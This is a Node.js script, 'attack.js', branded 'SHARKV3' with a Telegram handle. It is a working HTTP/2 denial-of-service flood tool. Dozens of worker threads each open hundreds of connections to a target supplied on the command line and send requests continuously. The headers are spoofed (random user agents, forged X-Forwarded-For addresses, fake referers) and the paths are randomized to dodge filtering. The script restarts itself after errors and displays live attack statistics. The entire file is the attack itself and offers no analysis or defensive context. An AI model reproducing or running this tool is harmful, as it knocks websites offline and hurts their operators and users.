const http2 = require('http2');
const { Worker, isMainThread, workerData } = require('worker_threads');
const readline = require('readline');
const net = require('net');
const os = require('os');
const fs = require('fs');

const THREADS = 22;
const POWER_MULTIPLIER = 2;
const MAX_INFLIGHT = 2000;
const LIVE_REFRESH_RATE = 100;

let totalRequests = 0;
let successCount = 0;
let errorCount = 0;
let maxRps = 0;
let rpsLastSecond = 0;
let end;

function getRandomInRange(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Random User-Agent Generator
function getRandomUserAgent() {
    const platforms = ['Windows NT 10.0', 'Macintosh; Intel Mac OS X 10_15_7', 'X11; Linux x86_64'];
    const browsers = ['Chrome/115.0.0.0', 'Firefox/117.0', 'Safari/537.36', 'Edge/115.0.1901.203'];
    const platform = platforms[Math.floor(Math.random() * platforms.length)];
    const browser = browsers[Math.floor(Math.random() * browsers.length)];
    return `Mozilla/5.0 (${platform}) AppleWebKit/537.36 (KHTML, like Gecko) ${browser}`;
}

// Spoofed headers generator
function getRandomHeaders() {
    return {
        'user-agent': getRandomUserAgent(),
        'x-forwarded-for': `${getRandomInRange(1, 255)}.${getRandomInRange(1, 255)}.${getRandomInRange(1, 255)}.${getRandomInRange(1, 255)}`,
        'referer': `https://google.com?q=${Math.random().toString(36).substring(7)}`,
        'accept-language': 'en-US,en;q=0.9',
        'accept-encoding': 'gzip, deflate, br',
        'cache-control': 'no-cache'
    };
}

// Random paths
function getRandomPath() {
    const paths = ['/', '/home', '/api', '/product', '/news', '/blog', '/about', `/random${getRandomInRange(100, 999)}`];
    return paths[Math.floor(Math.random() * paths.length)];
}

if (isMainThread) {
    if (process.argv.length < 3) {
        console.error('Usage: node attack.js <target>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3]) || 60;

    let runCount = 0;
    function startAttack() {
        runCount++;
        if (runCount > 20) return;

        end = Date.now() + duration * 1000;
        console.clear();
        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
        console.log(`SHARKV3! - NO CPU WARMUP .exx`);

        for (let i = 0; i < THREADS; i++) {
            const initialConnections = getRandomInRange(200, 500);
            new Worker(__filename, { workerData: { target, duration, initial: true, connections: initialConnections } });
        }

        for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
            const additionalConnections = getRandomInRange(154, 500);
            new Worker(__filename, { workerData: { target, duration, initial: false, connections: additionalConnections } });
        }

        setInterval(() => {
            maxRps = Math.max(maxRps, rpsLastSecond);
            renderStats();
            rpsLastSecond = 0;
        }, LIVE_REFRESH_RATE);

        const server = net.createServer(socket => {
            socket.on('data', data => {
                const msg = data.toString();
                if (msg === 'req') totalRequests++, rpsLastSecond++;
                else if (msg === 'ok') successCount++;
                else if (msg === 'err') errorCount++;
            });
        });
        server.listen(9999);

        process.on('uncaughtException', err => {
            console.error(`[ERROR]: ${err.message}`);
            setTimeout(startAttack, 500);
        });
    }

    function renderStats() {
        readline.cursorTo(process.stdout, 0, 0);
        readline.clearScreenDown(process.stdout);
        const timeRemaining = Math.max(0, (end - Date.now()) / 1000);
        const secondsRemaining = Math.floor(timeRemaining);
        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
        console.log(`===========================`);
        console.log(`total: ${totalRequests}`);
        console.log(`max-r: ${maxRps}`);
        console.log(`===========================`);
        console.log(`succes: ${successCount}`);
        console.log(`===========================`);
        console.log(`TIME REMAINING: ${secondsRemaining}s`);
    }

    startAttack();
} else {
    const { target, duration, connections } = workerData;
    const endTime = Date.now() + duration * 1000;
    const socket = net.connect(9999, '127.0.0.1');
    const sendStat = msg => socket.write(msg);

    function sendLoop(client, inflight) {
        if (Date.now() > endTime || client.destroyed) return;

        if (inflight.count < MAX_INFLIGHT) {
            try {
                inflight.count++;
                const req = client.request({
                    ':method': 'GET',
                    ':path': getRandomPath(),
                    ...getRandomHeaders()
                });

                req.on('response', () => {
                    inflight.count--;
                    sendStat('ok');
                });

                req.on('error', () => {
                    inflight.count--;
                    sendStat('err');
                });

                req.end();
                sendStat('req');
            } catch {
                inflight.count--;
                sendStat('err');
            }
        }

        setTimeout(() => sendLoop(client, inflight), 10);
    }

    function createConnection() {
        if (Date.now() > endTime) return;
        let client;
        try {
            client = http2.connect(target);
            const inflight = { count: 0 };

            client.on('error', () => {
                client.destroy();
                setTimeout(createConnection, 5000);
            });

            client.on('goaway', () => client.close());
            client.on('close', () => setTimeout(createConnection, 5000));
            client.on('connect', () => {
                for (let i = 0; i < connections; i++) sendLoop(client, inflight);
            });
        } catch {
            setTimeout(createConnection, 1000);
        }
    }

    for (let i = 0; i < connections; i++) {
        createConnection();
    }
}
